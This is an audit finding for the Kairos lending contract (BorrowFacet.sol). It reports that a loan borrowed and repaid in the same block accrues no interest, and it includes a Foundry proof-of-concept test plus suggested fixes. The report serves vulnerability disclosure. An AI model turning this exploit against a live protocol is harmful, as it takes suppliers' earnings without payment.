# Free loan for users if they borrow and repay in one block.

## Summary
SC: BorrowFacet.sol
1) There is an option to use loan for free(with no interest rate) if borrow and repay loan in same block. Also attacker can do this(borrow and repay with no fee) in absolutely every block and use this liquidity for arbitrage bot and so on. Cost attack: gas only (almost 0 at L2)
Supplier(who offered loan) can prevents it only after decrease allowance on tokens to 0 or waiting for expire date of loan offer.

## Vulnerability Detail
The core of vulnerability lies in  `BorrowFacet.sol`  in function `repay()` especially this part:
```solidity
 interests = RayMath.max(
                mul(loan.interestPerSecond.mul(block.timestamp - loan.startDate)),
                loan.payment.minInterestsToRepay);
```
because if you borrow and repay in one block both will return `0`;

So you can run this test to check it out `forge test --match-test testBorrowAndRepayInSameBlockOnce -vvv
`:

```soldiity
    function testBorrowAndRepayInSameBlockOnce() public {
        uint256 nbOfLoans = 1;
        BorrowArg[] memory borrowArgs = new BorrowArg[](nbOfLoans);
        Offer memory offer;
        uint256 currentTokenId;

        getFlooz(signer, money, nbOfLoans * getOfferArg().amount);

        for (uint256 i = 0; i < nbOfLoans; i++) {
            OfferArg[] memory offerArgs = new OfferArg[](1);
            currentTokenId = getJpeg(BORROWER, nft);
            offer = getOffer();
            offer.collateral.id = currentTokenId;
            offerArgs[0] = OfferArg({
                signature: getSignature(offer),
                amount: getOfferArg().amount,
                offer: offer
            });
            borrowArgs[i] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});
        }

        console.log("Borrower balance of erc20 BEFORE borrow :",money.balanceOf(BORROWER));
        console.log("block.timestamp BEFORE borrowing:", block.timestamp);
        vm.prank(BORROWER);
        kairos.borrow(borrowArgs);
        console.log("Borrower balance of erc20 AFTER borrow :",money.balanceOf(BORROWER));

        assertEq(nft.balanceOf(BORROWER), 0);
        assertEq(money.balanceOf(signer), 0);
        assertEq(money.balanceOf(BORROWER), nbOfLoans * getOfferArg().amount);
        assertEq(nft.balanceOf(address(kairos)), nbOfLoans);
        for (uint256 i = 0; i < nbOfLoans; i++) {
            assertEq(nft.ownerOf(i + 1), address(kairos));
        }

        uint256[] memory loanId = new uint256[](1); 
        loanId[0] = 1;
        
        vm.startPrank(BORROWER);
        money.approve(address(kairos),1000000000000000000); 
        kairos.repay(loanId);
        console.log("Borrower balance of erc20 AFTER repay :",money.balanceOf(BORROWER));
        console.log("block.timestamp AFTER repayment:", block.timestamp);
    }
```

As we can see no fee was paid, repayment also was successfully proceed.


## Impact
Suppliers loan offers could be used for free. Potential loses - expected average APR while using Kairos protocol.

## Tool used
Manual Review

## Recommendation
1) Integrate minimum fix interest rate even if repayment in the same block or
2) Decline repayment in same block.
